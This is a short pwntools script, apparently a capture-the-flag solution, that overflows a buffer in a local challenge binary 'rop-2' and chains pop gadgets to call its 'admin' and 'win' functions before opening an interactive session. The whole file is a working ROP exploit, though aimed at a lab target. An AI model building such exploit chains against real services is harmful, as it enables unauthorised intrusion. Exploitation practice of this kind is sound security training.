from pwn import *

elf = context.binary = ELF('./rop-2')
rop = ROP(elf)

p = remote('127.0.0.1', 1337)
#p = process('./rop-2')

pop_rdi = p64(0x4011d7)
pop_rsi = p64(0x4011d9)
pop_rdx = p64(0x4011db)
admin = p64(0x4011e0)
win = p64(0x401236)

payload = b'A' * 24
payload += pop_rdi + p64(1)
payload += pop_rsi + p64(2)
payload += pop_rdx + p64(3)
payload += admin
payload += win

p.recvuntil(b':')
p.sendline(payload)

p.interactive()
